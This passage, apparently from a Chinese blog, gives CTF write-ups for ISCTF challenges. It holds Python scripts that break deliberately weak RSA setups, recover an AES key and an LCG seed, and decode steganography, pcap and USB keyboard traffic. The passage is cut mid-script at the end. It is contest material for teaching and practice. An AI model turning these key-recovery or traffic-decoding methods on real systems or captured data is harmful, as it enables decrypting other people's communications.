+n=4321524416983780646994834778612486851863709339970595612409550086067211224407144019110798099401660010305645681548980160563216101786447875231976835115531375372678886339587480251211072894186558627897353793098608766868067029578667171419890150599640781594755080391489447462042167529203389236065727274166091741227068469987681083794139925327545810024038937132463518225611578727737940746784891867532498184642892826569777559107609493212332054559366409007685504768163376250281644004067745087899653778023414105973047620041288118404657934689253192043728590231618132716567084621670074256312939305265244486145758609971249077639085204680923108132415216543541472534580414274250979940330459551536830268428508217821060604260805109071534457808355664329902779603050878055690772430842865701249378096775899778255848773171108341331128673249899037133851535556515961699925809139476576825524135111237249709241579903807179252011010794867269715170739895392375920757559721516050680666658719990497863646989338960261844762127142439486275294670858114079687572243312184222126710967744971775585723045524467708387051034760208768956889939050498139189352842087278125173957182804116052402778416216669522309692266036094371308166663738284209615212016564171075874421472070422416318901926525719485991792111414333398004433143751908199358861514725313334333703539239414806773743941986164981642517673117412666430463318509571757766510835600758060976848374353352239044908034501477295696684294816091801944163877509558909040753907584672390823893991672246726026216973013330313971007514064831801564703364591696610900089228302936595848024616691878437618798864186634802647568239526771151323609650598156701595265876736712670677452013054393336294483452480213271032488201259990782289047132105989846972462094302132564809025802421057537091870932014884606863807260521123084423689494401900014232257381801590783735595575258160274248494498550583673688754220860142413631521279464318987425447302135444093663034598455694901199312497459228254746451233078954904159983269585883146959928222698672413648364391121696092287848931565798557217897678221379451042304811449415982434055522599829843482810025780349284547491767219221510351411192251236517341826619338084348136539121415210345488359563985046136632077665460793346345051213014836088333266911684271237227766588616771431226302155269893547077232087387411935345207081799500649921586279416751311277417949192360648342427657867424947189027886922112452681434778850977010752230391327878892161
+c=1319666577538961333645698288755316431847498788803191213042970951363587036899021668814931340784440773619019635330248746606532233949080268712626456845590851812018539646705520729734738948568349756255640832936325965096602018372418260009779997764653043892043725224481361578258532294625476542003357969893609762981355267857532927948279737945466285738730414948695579002627741734690862181161919734547857550654813379550806374778412603233570494684223057004866601064851006909940259029023083838730497564657690493780040030061594915385886594845808342023634855913932575150487723897981518504381563064479784253539091893925934095008385592529031453149337783826491324308222762190756839839091742536583068791632135883271750510776330897598323339568926234205068941397524390446254057404779041850572848212437589629794980799894974937730065394307284096622814438575278571743516485062058882794531407454597341604166586040406867868323002258035737328450923576878935675998377134860357842547595516243737449809845708319003744144753130977649201725370898918939022097783844477196723482879094829249203949784703408369396219233552019108990900029123063369670129291960293576115301371071209198455299007327352602249399500334424934488528506773472420414119617828578424633182320749576697196936762283306228974126242434663703609495003656244194067493769815032134577138807799395279843708630774412341952691146906264694889245375545635688534662371202213660012977431598746482601668122679279419039288257069843297770840263002870206849857995148396439717143553611140228607531647245352254251824086797704561756363448681983654454393569932173970943157225527780067126895832370645456372127507057750232257828579628856504832975775855059816283684123444984393171125206440588627925736223222718784319209561804023835238526792966229582251575475514349566824846911411659740321154272534589694497411065971714157409318007179403833025337349924938487211920583780456897879801099476865645416182025930390267064170271613760577949655548949317295792361772032185463678410983568470647837758657058230086368185901572658482084202212103405161775243930901117532775865963215971025744893777631306256061896284125630451368067313753222195227231131526000755922331413457862253392530308284156400411897252674398583100198330007779643967156773216464341590817951828849769679134515304258819218015083183653130972243262400248230445031327719507314015062447355358100770763425336581258193908638241498461735819218673116282476452340137513156421147748432605954889277898079292196216
+
+p = (gmpy2.iroot(n,8)[0])
+
+phi = p**7 * (p-1)
+d = gmpy2.invert(e,phi)
+print(long_to_bytes(pow(c,d,n)))
+</code></pre>
+<h2 id="rsa-d"><a href="#rsa-d" class="headerlink" title="rsa_d"></a>rsa_d</h2><pre><code class="py">import gmpy2
+
+p=86730239
+q=14213789
+e=65537
+print(gmpy2.invert(e,(p-1)*(q-1)))
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/419d7dd30ee9ba33c4ec9c59e9c52a75.png" alt="image-20231123131130690"></p>
+<h2 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy_rsa"></a>easy_rsa</h2><pre><code class="py">import gmpy2
+from Crypto.Util.number import *
+
+p=148918429211833931311377232986584938973743059073212599839623115665427914895645669183501178576150391744289581460816605746502214931778341477867351155596387652933495781711254282883751261939677404090197147081656181788591929669163136868218964709293920125621540609400422868787905644587832972557912408715930323376627
+q=171038402266367256939123936702748804595437315282132849911066814500139712498763515340679622167260249888545143330007405802982392847190278920693250460850524633520975831749286968589871651025162017261096713799932261700764271950050347067565161191962564685771230794171949764436266574441764839874488376032231549892729
+e=65537
+c=14851493117751729314786395590288851716359993587230817853630888106953736856046237283262458768943755928276114968455892230282415271874575102191848094467483072917406023563216365448317356224168547471575514703164457734782926340881270452909703833791596549989295859769700115957204387979364759151189412041661372232990709426700356130619157951306602124832829643934472455951505172648145342937402994245253247196676517368660145618930947580047826592385805422897667170848124234255930751616877489527111466935276096332430156997438276378838842292858233866402475094148461288467628876155587524351026609368358477501337216881543486822532627
+
+d = gmpy2.invert(e,(p-1)*(q-1))
+print(long_to_bytes(pow(c,d,q*p)))
+</code></pre>
+<h2 id="夹里夹气"><a href="#夹里夹气" class="headerlink" title="夹里夹气"></a>夹里夹气</h2><p>嘤嘤？换.</p>
+<p>嘤嘤嘤 换-</p>
+<p>解码摩斯</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/af2ec451cca1cdbd127008ddf6890b29.png" alt="image-20231123131710918"></p>
+<h2 id="ezRSA-τ"><a href="#ezRSA-τ" class="headerlink" title="ezRSA(τ)"></a>ezRSA(τ)</h2><p>这题考信息收集(</p>
+<p>参考</p>
+<p><a target="_blank" rel="noopener" href="https://r98inver.github.io/posts/teamitaly-bigrsa/">https://r98inver.github.io/posts/teamitaly-bigrsa/</a></p>
+<p><a target="_blank" rel="noopener" href="https://7rocky.github.io/en/ctf/imaginaryctf/pqqp/">https://7rocky.github.io/en/ctf/imaginaryctf/pqqp/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.maple3142.net/2023/10/09/balsn-ctf-2023-writeups/#prime">https://blog.maple3142.net/2023/10/09/balsn-ctf-2023-writeups/#prime</a></p>
+<p><a target="_blank" rel="noopener" href="https://7rocky.github.io/en/ctf/other/balsn-ctf/prime/#">https://7rocky.github.io/en/ctf/other/balsn-ctf/prime/#</a></p>
+<p>生成相关素数</p>
+<pre><code class="py">rs = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97]
+P = prod(rs)
+res = []
+for k in range(2,2**6):
+    a = 6 * k + 1
+    b = 12 * k + 1
+    c = 18 * k + 1
+
+    if is_pseudoprime(a) and is_pseudoprime(b) and is_pseudoprime(c):
+        n = a * b * c
+        res.append(n)
+print(res)
+</code></pre>
+<pre><code class="python">from Crypto.Util.number import *
+from sympy import factorial
+from gmpy2 import gcd
+import gmpy2
+
+n = 11947241219140615237486309604628973391930339499486798714294498785973885463922548820705069266901903036359254530976927762175262118185159625298369758973935607721381080656199430417818042316007700805008489750740972102287526203064312544340176751751266738219862839022892152635044837041435349904947659346174437695051460882295109851494351994498403791853684239883961766735230202016890875913906900424655711952381425165331389205409282026144667620577946333963601349932905443037145145394667138672752796990411249984169798953060016353748467221154507518574580014882822860853751863757579945329482337792853278715658322366578632817369803
+leak = 4825516411405566882589539973300777582630401687252523937619475044718073214792109569356301252345907914527064817796240727881691399437316660502564323688151311441558823720142071322647007043253626474853010585775710666373651910201889816367922377400970334479040370865879692204764210349607801862666059991789964453439198722962928173197103040385999540054988070333338229570681105393323319767364566644771731595597298210924296456293443125736685469259629163687986114207231233692023613120260155832741199446052855856512791809968963821161765216500389495853488545132008219841635172896843241988125093920217328861507191614658581776695350233593334984646128341640512614300048002219790302478025661133721688232990437685571940604588227022076092857294647830142309441330515812342199940466483115991318018705011472671758063610572930560763516803732693572940939851140384123593105367117155740563057395940645038058194280259524467405820813428765139386968927021061208348111646257434870000866555555283176852834141906387086839051793789126474095527358879630274092172435022326207193319806666865704778907868548658370890623182731938070419969709739233504224100413506514936517272134494776127809327563935813198793891897000404156963455000732616317276241867836699641699825594195079194154957636030485909612033254350828892222046169586844737908349421869385194421981553067305581842171364022745759111602699744161574724372962242132415149146766136601016174658042678857388889036814591399168640678928083442174651493660991088328784105160030857387096251561933704301600695757426945716557961698202485226605485682131045560193822624290720243852434254301324766198129736640005205530445739302632191151740246117208267182630330046600955724262084795763080838384593939971523865769318326101179866187596006185138294477350533316908592086441208575935282494961976691089358976722199557082176285926812134290542838960814502829473372780200310674359645482281037654052483716329497333729594792122297988611883754886634452292313599416610842690057657285337854049766320641249317238780428383587602425132767334811708075065922641191109650660427678019567095309270443930385437292172296652003394183918270707887845018685247162812541929998945735270109736669595830167257239265204520272132384023622231518288514767919183916561550558812478144292894132331163501566746036390319663066054892756826660841952717280005731719082266616429646501565960817772663658546555336959754321712751857740551378987853931613973604348308746819562341219749677392565068390386908064199536445684309718116754288299091975226013592388160308117145043236992250577771659408413506586402897189336742792418163003231783947003853396754144599319566763313339145462208172531322682800226151072022731913191728047323245146556315571396082728252085753230639541374982105041248659074695696205654079837224195868428271353983820725017250413714060967825638577327604252122887136259380946072629481202720339169708229866846597577227829317443910036825722430374711816074735238082313198164126791797947010044130222158124667234003098164746100341636238823175289796896896408971518797835906067939914494546110471749352544064300485882179448030898818405400902242119590645639910708635188342567159795613212660990908765619684401061336405049960091659288716162966504703741105477420409053115823924764680153604215949521605456710353305498258615912458036292507652321420277318757146737030628878096962452278346772976364597137682209395761868224382621093921689415088745975049380393255899867417274843474628482169247388041616142896804170033688742622605192409970919836724035274730923747265191248135577704760607590
+c = 4058526944014006069084945174812818814825704864122299028618329411106188952604728150732223145114766938864644072527523082946069975859381918224872075058517683896020489424720005770218969436595364473179601299857281520204212872074837132357469599147175121200219338329188718982224238281009625352190581095607599976922610436817213692622671732783554216636941121695116377777616027462234472833366922829073660312229117800995468022619934881890343086653577149166193139948443894324239522101581089953817527886638425552917578146958961373353776642091545344162923084513872918786615317499139918810812014781753970806739855831453833956364967
+
+
+def factor(n, t):
+    for _ in range(10):
+        for b in range(1, 100, 2):
+            num = pow(b, t, n)
+            if gcd(num-1, n) not in [1, n]:
+                return gcd(num-1, n)
+    return False
+
+def get_k_y():
+    y = 0
+    for k in range(800, 1500):
+        fact = factorial(k)
+
+        y_ed = (leak - k) // fact
+        y = gcd(int(y_ed), int(leak - k))
+        if y &gt; (1 &lt;&lt; 100) and y.bit_length() &lt;= 1280:
+            print(f&#39;&#123;k = &#125; &#123;y = &#125;&#39;)
+            break
+    return k,y
+
+k,y = get_k_y()
+
+# e = gmpy2.iroot(int(((leak-k)//y) % factorial(k)), 2)[0]
+# tem = int((leak-k)//y)
+# kphi = (tem-e**2) // factorial(k)
+# phi_ = kphi
+# while phi_ % 2 == 0:
+#     phi_ = phi_//2
+#     p = factor(int(n), int(phi_))
+#     if p:
+#         print(&#39;found!&#39;)
+#         print(p)
+#         break
+# 109147047401610068589196117668478678573425640467855721459792193588022086523216277422282084972626038309107642247231426126118154349890627263786908440994518759632567543350240699529434894837492043098560661823088926312187833910086403576147831906252128915891099450787538630572210256420615161408120096393238146759283
+p = 109147047401610068589196117668478678573425640467855721459792193588022086523216277422282084972626038309107642247231426126118154349890627263786908440994518759632567543350240699529434894837492043098560661823088926312187833910086403576147831906252128915891099450787538630572210256420615161408120096393238146759283
+q = n // p
+phi = (p-1)*(q-1)
+e = 65537
+d = gmpy2.invert(e,phi)
+print(long_to_bytes(pow(c,d,n)).decode(),end=&quot;&quot;)
+
+
+from sympy import *
+from functools import reduce
+from Crypto.Util.number import *
+import gmpy2
+from gmpy2 import is_prime as is_strongPrime
+
+
+n=138222025039224144545251830624229986468723531196582463907557734108529994926504669875900898789473948111199016914847829105939167293515822413866727879262875702026534563930475309506834431656926222982363543666448736091756871792887144283877167509418070979449484508499296324616988840431116233637168977730122017878289
+leak1=23535059927033628406212169278224758389583882623183004031205822980722154537430761635153622180505243837027568034322858038302626132200979370182327110682738910
+leak2 = [362437850887271063413256292444148642949623196635276044583204094265607936120337004605360832421011, 1932915843524327487337992118762711929552569713433223514001673251237692307587356544615955431611435994003602897830069566867051943572065473955405337889221398, 11222178024143398739150445814520244630341642052876364179793404105841311693968292227072031763726153574031884490677131749512430325919668649359617953965112844, 5408933876805830533113961512210040977462510675785228477646978801328722923647434079128879371684477664804744431834418916837956820965870203842552250165916773, 1447143741705069323823257922715038721270982554690635708441585728089036094805730054505696492295730683300002193478561819037345041940787115528445592303142510, 3707657531268843465369646969917923274507341341483950204025637357600814449263032574496424566705812439915548150679438579110456264431525526309588664326456861, 9263925820149827740182684692442727161206242182976684575667062235695526783971703826794731732152445051579616121306722939129265340347908823003172137299057843, 207494591333501391015462321304802957885928775185602834554977737560856036337667840127810136802887548047878444936730742505483927963807357904024967768148122, 7052936859446617933917872361389151092893299250603966165472023802877016733939957851026719428770748111897050866474067880613419756475700748999497496482278608, 1169538791889404037461397919075674424569430764451305755000680272926397357803359328850780774937432248011264334398346178303234064891680342161511829008635621]
+final = [2268617516274900905319941795987877533673889507146326516564545408684476960310333170888941124460992562245780101836116975666368936099249664924148379487909122, 1445275952377746701088629016221431744592935398639655895336779954310077866709012082302847692239730041591520169244063854849129773530127510048494782550102381, 7]
+phi = n - (leak1%n) + 1
+e = 0x10001
+d = gmpy2.invert(e, phi)
+
+
+def is_prime(p):
+    check = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37,
+          41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97]
+    return all([pow(i, p-1, p) == 1 for i in check])
+
+def cal_key():
+    for key in range(10**9, 2,-1):
+        if (is_prime(key) and not is_strongPrime(key)):
+            print(key)
+            return key
+
+def crack_unknown_increment(states, modulus, multiplier):
+    increment = (states[1] - states[0]*multiplier) % modulus
+    return modulus, multiplier, increment
+
+
+def crack_unknown_multiplier(states, modulus):
+    multiplier = (states[2] - states[1]) * \
+        inverse(states[1] - states[0], modulus) % modulus
+    return crack_unknown_increment(states, modulus, multiplier)
+
+
+def crack_unknown_modulus(states):
+    diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])]
+    zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])]
+    modulus = abs(reduce(gcd, zeroes))
+    factors = factorint(modulus)
+    while not isprime(modulus):  # 注意这里N刚开始有可能不是素数导致后面无法求出逆元
+        for prime, order in factors.items():
+            if prime.bit_length() &gt; 128:
+                continue
+            modulus = modulus / prime**order
+    multiplier = (states[2] - states[1]) * \
+        inverse(states[1] - states[0], modulus) % modulus
+    increment = (states[1] - states[0]*multiplier) % modulus
+    seed = ((states[0] - increment) * invert(multiplier, modulus) % modulus)
+    return modulus, multiplier, increment, seed
+
+modulus, multiplier, increment, seed = crack_unknown_modulus(leak2)
+for i in range(11):
+    seed = (seed * multiplier + increment) % modulus
+
+for key in [294409, 56052361, 118901521, 172947529, 216821881, 228842209]:
+    base = seed ^ key
+    c = 0
+    times = 0
+    for i in final:
+        c += i * base ** times
+        times += 1
+        res = long_to_bytes(pow(c, d, n))
+        try:
+            print(res.decode())
+        except:
+            pass
+</code></pre>
+<h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><pre><code class="py">import gmpy2
+from Crypto.Util.number import *
+
+c = 29897791365314067508830838449733707533227957127276785142837008063510003132596050393885548439564070678838696563164574990811756434599732001622138564176327233154381380717648392357672642893142367607369679906940371540867456654151408884171467638060523066406441697453971996011548195499549200103123841556085936672833238264876038160712793697159776332101536779874757463509294968879216810485825310481778472384531442206034564488532399171243463881900578407746982324779260941957792455217641883334131366614310644607114128868153897806362954456585661855569432513785225453501792356175649676419772626548071916379318631677869452985829916084336045071072493567871623113923140668031380684940109024609167449291380675124701557542736834722898328082888430566229322840781411336263268594978558564310744076581639469210462567543585251718744340216155557606004995449505782302864725856877289388008819135023371948017425832082773421030256964953984562211638060
+N = 3231913372897424708803097969843687520868057190788284975066875241636436021279559026753076528399891936983240045179193386905918743759145596242896507856007669217275515235051689758768735530529408948098860529277921046146065473333357110158008648799207873976745048714516868561754202543130629713461365314627535982379718931633528922076268531363809414255082933615667770491818402126891370106045838695484124212397783571579791558324350069782623908757815983802849109451590357380624488436968737140312471089662428308113246310588336044438265822574558816510054763215983649467009345458480077882624118620789015758507736272402998721366662352794082495441303895025585316667229865533166614969641012195668280586477033200418153345241668242651407009849656745509386158276185301334443855737552801531617549980843398648751032649895403939319648954908487619711555700124294191702406981128355348449748466449951568451135718146828444185238617155432417897711198169
+d = 220908195398117048628110042133057032501548264225985823161565460390793825899523662424732910718579350524590368287207857059670558852106434615134645183432670023784725430385048028248108677670095524205518013647694485975996499747580966911259433184798952372110628624294686853944766950244209186984164963987120416687012811346656498861438432610431705868541829977481875385468143747334359481673214618931159403123892213161430602430294790913847722073762999311674428134241956293914716183107414340330449465142849402354034926378025006749405210014879947411570380433942279355488861684317611066949685697268714760755591128598654573304969
+
+
+pq = gmpy2.gcd(pow(2, d*N, N)-2, N)
+
+m = pow(c, d, pq)
+print(long_to_bytes(m))
+</code></pre>
+<h2 id="1zrsa"><a href="#1zrsa" class="headerlink" title="1zrsa"></a>1zrsa</h2><p>p1 p2 接近</p>
+<p>连分数逼近得到q1 q2</p>
+<pre><code class="py">from Crypto.Util.number import *
+import gmpy2
+
+
+c = 10514867898770499427284608506159580569755258729683776720082395249877529851029152305989048383470182992945743997295638334301128554841767619528809377736651238576700664675871769469687466885347209033023021132575700436470105289467423655742323143373578268184141573237433927498143740155552829633601489926767185335051352605346248971754473960051955670785777007641909166041398566067524811394639822575661469340152913706417365065683835945980239268665146900957692685590242386540944646586739158427428484471978559453954674292300496568823382513505511940062159025700312492163454304120916055466108498000990408937265075788135466153131436
+N1 = 29306627985861300819651846356448043523015086509329909246911330574896611830331438353458702041787309531570626136669100576501108581024502570212983369979387658041578384466200573362881060761873478590684611265249166591510948597798713864127744488747451815919677861684787135464097885906630772472111899455047125676738720391327331161464894360886214160668909531050207033060523194208723151015702926842472554933849380343375654696115359960495727909221926251630408376527033291123026893207722440649867394971680316008434251667567174806214522621693042164997381729300075394393372808917061813346794422821819494227772694592990703688149467
+N2 = 18405525902524887428651801489049128242565457677879715229456940729064725933277139190670749899959483734341103740185991771024797037242681566772189045321838652668819112989587974866361063424698215713773139281840970499871668796770682692589505769008516630604297570518689639885716307469568821629424402742264467677407820449195383921766157185602677665872353099155904715047452319853202981674101731121033360393547940246101864940155160699277417096395998766928213545196492031975135121409309520198853066288180944871441224241681478164494169741263236267316380581883196836731872676312125837497320438964940186318916950049777255612191899
+e = 65537
+
+
+
+
+def continuedFra(x, y):
+    cF = []
+    while y:
+        cF += [x // y]
+        x, y = y, x % y
+    return cF
+
+
+def Simplify(ctnf):
+    numerator = 0
+    denominator = 1
+    for x in ctnf[::-1]:
+        numerator, denominator = denominator, x * denominator + numerator
+    return (numerator, denominator)
+
+
+def getit(c):
+    cf = []
+    for i in range(1, len(c)):
+        cf.append(Simplify(c[:i]))
+    return cf
+
+
+def attack(e, n):
+    cf = continuedFra(e, n)
+    for (p2, p1) in getit(cf):
+        if p1 == 0:
+            continue
+        if N1 % p1 == 0 and p1 != 1:
+            return p1, p2
+    print(&#39;not find!&#39;)
+
+
+q1, q2 = attack(N1, N2)
+p1 = N1 // q1
+
+print(GCD(N1,p1))
+d = gmpy2.invert(e,(p1-1)*(q1-1))
+print(long_to_bytes(pow(c,d,N1)))
+</code></pre>
+<h2 id="ezAES"><a href="#ezAES" class="headerlink" title="ezAES"></a>ezAES</h2><pre><code class="py">from Crypto.Util.number import *
+from Crypto.Cipher import AES
+import os
+
+
+
+c = b&#39;bsF\xb6m\xcf\x94\x9fg1\xfaxG\xd4\xa3\x04\xfb\x9c\xac\xed\xbe\xc4\xc0\xb5\x899|u\xbf9e\xe0\xa6\xdb5\xa8x\x84\x95(\xc6\x18\xfe\x07\x88\x02\xe1v&#39;
+hint = 0x47405a4847405a48470000021a0f2870
+
+# padding  9 个 tab + 已知明文 ISCTF&#123; 6个 爆破剩余一个 得到key
+# b&#39;\t\t\t\t\t\t\t\t\tp047405a48asdeqa48470000021a0f287098asn&#39;
+
+m = b&#39;\t\t\t\t\t\t\t\t\tISCTF&#123;&#39;
+i = 1
+tem = m + chr(i).encode()
+res = bytes_to_long(tem) ^ (hint)
+message = long_to_bytes(res)
+
+# 通过观察特征猜测最后一位也为A
+# NISANISANISANISA
+key = b&#39;NISANISANISANISA&#39;
+
+
+cipher = AES.new(key, AES.MODE_ECB)
+iv = os.urandom(16)
+
+aes = AES.new(key, AES.MODE_CBC, iv=iv)
+res = aes.decrypt(c)
+print(res)
+# b106cea3fb848e7bea310c9851f15c1&#125;
+# ISCTF&#123;
+# 拼接起来还差一位 爆破一下就行
+</code></pre>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="小猫"><a href="#小猫" class="headerlink" title="小猫"></a>小猫</h2><p>foremost抽出第二张猫</p>
+<p>没啥用stegsolver发现里面还有张图</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/fc7bbd97384ef4f94ca567ad149151ba.png" alt="image-20231125234428920"></p>
+<p>是社会主义核心价值观</p>
+<p>结合原图左上角的坐标</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/ec081ff6a100d42db1f95430c143d67d.png" alt="image-20231126000243054"> </p>
+<p>查表即可</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/970dcf99d9481225698f3f0122dc1651.png" alt="image-20231126000830112"></p>
+<pre><code class="python">table = [[&quot;富强&quot;,&quot;自由&quot;,&quot;爱国&quot;],[&quot;民主&quot;,&quot;平等&quot;,&quot;敬业&quot;],[&quot;文明&quot;,&quot;公正&quot;,&quot;诚信&quot;],[&quot;和谐&quot;,&quot;法治&quot;,&quot;友善&quot;]]
+print(len(table))
+points = [(3, 2), (3, 2), (3, 2), (3, 3), (3, 1), (3, 2), (2, 1), 
+          (3, 2), (4, 2), (4, 2), (3, 3), (2, 1), (3, 2), (2, 1), 
+          (3, 2), (4, 1), (3, 2), (2, 1), (4, 1), (2, 1), (4, 1), 
+          (2, 3), (4, 1), (2, 2), (3, 2), (3, 2), (3, 2), (1, 2), 
+          (4, 1), (4, 1), (3, 2), (1, 2), (4, 1), (1, 1), (3, 2), 
+          (3, 2), (4, 1), (3, 1), (4, 1), (4, 1), (4, 1), (2, 3), 
+          (4, 1), (3, 1), (4, 1), (2, 2), (4, 1), (1, 2), (4, 1), 
+          (1, 3), (3, 2), (1, 2), (4, 1), (1, 1), (4, 1), (3, 1), 
+          (4, 1), (2, 3), (4, 1), (4, 2), (4, 1), (3, 2), (4, 1), 
+          (4, 2), (3, 2), (1, 2), (3, 2), (3, 1), (3, 2), (3, 2), 
+          (4, 1), (4, 2), (4, 1), (3, 2), (4, 1), (3, 2), (4, 2), 
+          (4, 3), (4, 2)]
+res = &#39;&#39;
+for point in points:
+    x,y = point
+    res += table[x-1][y-1]
+
+print(res)
+</code></pre>
+<h2 id="一心不可二用"><a href="#一心不可二用" class="headerlink" title="一心不可二用"></a>一心不可二用</h2><p>反编译后jadx打开 发现是unity小游戏</p>
+<p>在manage下没有找到assembly-csharp.dll</p>
+<p>于是去lib下找libil2cpp.so</p>
+<p>通过Il2CppDumper导出</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/1d01c82f8a86f571ddf0fda12c137716.png" alt="image-20231123080709854"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f7907792586d810131a9166bf858d6ee.png" alt="image-20231123080555202"></p>
+<p>再执行 <code>srcipt file</code> -&gt; <code>ida_py3.py</code> -&gt; <code>script.json</code> 进行函数关联</p>
+<p>然后就没然后了 这不是逆向</p>
+<p>回过头用010看看apk 搜flag</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6202738aaa2ef5aa8c717f88d10c81ac.png" alt="image-20231125075851937"></p>
+<p>发现flag.zip的路径</p>
+<p>我们找到并查看<img src="https://img-blog.csdnimg.cn/img_convert/352cad3736ee8d95cda2b83cbd50bac8.png" alt="image-20231125075924154"></p>
+<p>考虑到下面的报错</p>
+<p>是语法错误 猜测密码是SyntaxError</p>
+<p>得到flag</p>
+<h2 id="杰伦可是流量明星"><a href="#杰伦可是流量明星" class="headerlink" title="杰伦可是流量明星"></a>杰伦可是流量明星</h2><p>binwalk 抽出pcap包</p>
+<p>发现访问了login.jsp</p>
+<p>追踪tcp流<img src="https://img-blog.csdnimg.cn/img_convert/0d913def85516bf2bc9786740af0685b.png" alt="image-20231123160457716"></p>
+<p>解码得到flag</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/400145dd5b3bcb226954b74f8f4c91a0.png" alt="image-20231123160433498"></p>
+<p>提交记得换前缀</p>
+<h2 id="小黑小白"><a href="#小黑小白" class="headerlink" title="小黑小白"></a>小黑小白</h2><p>复制进记事本 改字体大小为1发现类似二维码</p>
+<p>然后复制颜色较深处数据 发现都是45678 那么将其替换为1 其余替换为0</p>
+<p>然后转码扫码</p>
+<pre><code class="py">with open(&quot;data.txt&quot;,&quot;r&quot;)as f:
+    data = f.read().replace(&quot;4&quot;,&quot;a&quot;).replace(&quot;5&quot;,&quot;a&quot;).replace(&quot;6&quot;,&quot;a&quot;).replace(&quot;7&quot;,&quot;a&quot;).replace(&quot;8&quot;,&quot;a&quot;)\
+    .replace(&quot;9&quot;,&quot;0&quot;).replace(&quot;0&quot;,&quot;0&quot;).replace(&quot;1&quot;,&quot;0&quot;).replace(&quot;2&quot;,&quot;0&quot;).replace(&quot;3&quot;,&quot;0&quot;).replace(&quot;a&quot;,&quot;1&quot;)
+    with open(&quot;res.txt&quot;,&quot;w&quot;)as f2:
+        f2.write(data)
+</code></pre>
+<h2 id="小蓝鲨的秘密"><a href="#小蓝鲨的秘密" class="headerlink" title="小蓝鲨的秘密"></a>小蓝鲨的秘密</h2><p>伪加密</p>
+<p>!<img src="https://img-blog.csdnimg.cn/img_convert/387806f89b8489fb8dcd6cef5281338c.png" alt="image-20231124134648889"></p>
+<p>crc爆破宽高</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c213b9048c7176210302064b7ec2ed4a.png" alt="image-20231123191308716"></p>
+<p>flag.txt中的文件像aes rabbit这种的特征</p>
+<p>解压得到密码</p>
+<p>解aes得到flag</p>
+<h2 id="easy-zip"><a href="#easy-zip" class="headerlink" title="easy_zip"></a>easy_zip</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/1851c17f0b3ddbfd3f807849b0f30132.png" alt="image-20231123224755981"></p>
+<h2 id="蓝鲨的福利"><a href="#蓝鲨的福利" class="headerlink" title="蓝鲨的福利"></a>蓝鲨的福利</h2><p>补png头</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d652d2e6cca89cb74094af9ac7432021.png" alt="image-20231124175807365"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/13dcdb57cc494ce7eb6067d063ef69f2.png" alt="image-20231124175829333"></p>
+<h2 id="Ez-misc"><a href="#Ez-misc" class="headerlink" title="Ez_misc"></a>Ez_misc</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/a90ba04ec52cdfe347a9b87509972ee9.png" alt="image-20231125154209126"></p>
+<p>补文件头尾</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/86c04a9fd128f3c6f8e7f2d2465af346.png" alt="image-20231125154222143"></p>
+<p>然后扫码</p>
+<h2 id="ezusb"><a href="#ezusb" class="headerlink" title="ezusb"></a>ezusb</h2><p><code>tshark -r usb.pcapng -T fields -Y &quot;bluetooth&quot; -e btatt.value | sed &#39;/^\s*$/d&#39; &gt; blue.txt</code></p>
+<p>tshark读取蓝牙流量得到blue.txt，手动删除多余的01，03字符</p>
+<p>knm提取usb流量得到usbdata.txt</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/38cb4d125bf11b19954935352e6ccd5a.png" alt="img"></p>
+<p>脚本去除多余字符</p>
+<pre><code class="py">usbdata = open(r&quot;C:\Users\abc\Desktop\usbdata.txt&quot;,&#39;r&#39;).read().split(&#39;\n&#39;)
+for i in range(len(usbdata)):
+    data = usbdata[i][2:18]
+    print(data)
+</code></pre>
+<p>结果和blue.txt手动拼接</p>
+<p>键盘流量脚本得到明文</p>
+<pre><code class="py">normalKeys = &#123;&quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, 